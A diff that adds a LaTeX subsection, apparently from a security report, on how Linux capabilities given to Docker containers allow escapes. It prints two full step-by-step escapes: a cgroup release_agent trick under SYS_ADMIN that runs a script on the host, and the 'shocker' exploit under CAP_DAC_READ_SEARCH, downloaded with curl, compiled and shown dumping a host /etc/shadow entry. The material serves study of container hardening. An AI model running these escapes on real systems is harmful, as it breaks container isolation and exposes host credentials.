@@ -1,0 +1,48 @@
+\subsection{Capabilities}
+To perform a privileged Linux kernel action, the process needs the relevant \lstinline{capability}. \lstinline{capabilities}\footnote{See the \lstinline{man page} of \lstinline{capbilities}}
+ are a Linux feature that allow specific privileged actions (e.g.\ sending raw packets). A process running as \lstinline{uid} 0(\lstinline{root}) has all capabilities.
+ Processes in a Docker container are given minimum capabilities, but if needed it is possible to add extra capabilities using the \lstinline{--cap-add} argument. It is also possible to drop unnecessary capabilities using the \lstinline{--cap-drop}. In privileged mode, the container has all capabilities.
+
+\hfill
+
+Giving containers extra capabilities, gives the container permission to perform certain actions. Some of these actions allow Docker escapes.
+
+\subsubsection{\texorpdfstring{\lstinline{SYS_ADMIN}}{SYS_ADMIN}}
+The Docker escape by Felix Wilhelm\cite{Felix-Wilhem-Tweet} needs to be run in privileged mode to work, but it can be rewritten to only need the permission to run \lstinline{mount}\cite{TrailOfBits-Docker-Escape}, which is granted by the \lstinline{SYS_ADMIN} capability.
+
+\begin{lstlisting}[caption={Docker escape using \lstinline{SYS_ADMIN}},captionpos=b]
+(host)$ docker run --rm -it --cap-add=SYS_ADMIN --security-opt apparmor=unconfined ubuntu /bin/bash
+(cont)# mkdir /tmp/cgrp
+(cont)# mount -t cgroup -o rdma cgroup /tmp/cgrp
+(cont)# mkdir /tmp/cgrp/x
+(cont)# echo 1 > /tmp/cgrp/x/notify_on_release
+(cont)# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+(cont)# echo "$host_path/cmd" > /tmp/cgrp/release_agent
+(cont)# echo '#!/bin/sh' > /cmd
+(cont)# echo "ps aux > $host_path/output" >> /cmd
+(cont)# chmod a+x /cmd
+(cont)# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
+(cont)# cat /output
+\end{lstlisting}
+
+Unlike before, instead of relying on \lstinline{--privilege} to give us write access to a \lstinline{cgroup}, we just need to mount our own. This gives us exactly the same scenario as before. We use a \lstinline{release_agent} to run code on the host. The only difference being that we have to do some manual work ourselves.
+
+\subsubsection{\texorpdfstring{\lstinline{CAP_DAC_READ_SEARCH}}{CAP_DAC_READ_SEARCH}}
+Before Docker 1.0.0 \lstinline{CAP_DAC_READ_SEARCH} was added to the default capabilities that a containers are given. But this capability allows a process to escape its the container\cite{Docker-Shocker-Seclists}. To demonstrate this attack a proof of concept exploit was released\cite{Docker-Shocker}\cite{Docker-Shocker-Analysis}. This exploit has been released in 2014, but still works on containers with the \lstinline{CAP_DAC_READ_SEARCH} capability.
+
+\hfill
+
+\begin{lstlisting}[caption={Docker escape using \lstinline{CAP_DAC_READ_SEARCH}},captionpos=b]
+(host)$ cd /tmp
+(host)$ curl -O http://stealth.openwall.net/xSports/shocker.c
+(host)$ sed -i "s/\/.dockerinit/\/tmp\/a.out/" shocker.c
+(host)$ cc -Wall -std=c99 -O2 shocker.c -static
+(host)$ docker run --rm -it --cap-add="CAP_DAC_READ_SEARCH" -v "/tmp:/tmp" busybox sh
+(cont)# /tmp/a.out
+...
+[!] Win! /etc/shadow output follows:
+...
+admin:$6$VOSV5AVQ$jHWxAVAUgl...:18142:0:99999:7:::
+\end{lstlisting}
+
+The exploit needs a file with a file handle on the host system to properly work. Instead of the default \lstinline{/.dockerinit} (which is no longer created in newer versions of Docker) we use the exploit file itself \lstinline{/tmp/a.out}. We start a container with the \lstinline{CAP_DAC_READ_SEARCH} capability and run the exploit. It prints the password file of the host (\lstinline{/etc/shadow}).
